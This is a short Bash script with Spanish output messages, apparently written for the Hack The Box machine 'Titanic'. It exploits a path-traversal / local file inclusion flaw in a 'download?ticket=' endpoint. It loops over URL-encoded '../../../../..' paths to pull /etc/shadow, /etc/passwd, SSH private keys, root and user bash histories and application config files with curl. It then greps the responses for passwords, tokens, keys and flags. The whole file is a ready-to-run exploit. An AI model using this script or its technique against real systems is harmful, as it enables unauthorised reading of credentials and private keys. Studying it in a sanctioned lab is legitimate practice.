#!/bin/bash

if [ -z "$1" ]; then
    echo "Uso: $0 <URL> (ejemplo: http://titanic.htb/download?ticket=)"
    exit 1
fi

TARGET="$1"
FILES=(
"/etc/passwd"
"/etc/shadow"
"/etc/hostname"
"/etc/hosts"
"/etc/crontab"
"/var/www/html/app.py"
"/app.py"
"/var/www/html/config.py"
"/home/developer/.bash_history"
"/home/developer/.ssh/id_rsa"
"/home/developer/.ssh/authorized_keys"
"/root/.bash_history"
"/home/developer/config.json"
"/home/developer/.config/"
"/var/www/titanic/"
"/var/www/html/titanic/"
"/var/www/html/static/"
"/var/www/html/instance/"
"/var/www/html/app/config.py"
)

KEYWORDS="password|passwd|pass|user|token|key|secret|login|admin|flag|ssh|base64"

echo "[*] Iniciando lectura de archivos con LFI en $TARGET"
echo

for path in "${FILES[@]}"; do
    echo "[+] Leyendo: $path"
    ENCODED_PATH=$(python3 -c "import urllib.parse; print(urllib.parse.quote('../../../../..$path'))")
    RESPONSE=$(curl -s "${TARGET}${ENCODED_PATH}")
    
    if echo "$RESPONSE" | grep -Eqi "$KEYWORDS"; then
        echo "[!] Contenido relevante encontrado:"
        echo "$RESPONSE" | grep -Ei "$KEYWORDS"
    else
        echo "[~] Nada interesante."
    fi

    echo "--------------------------------------------"
done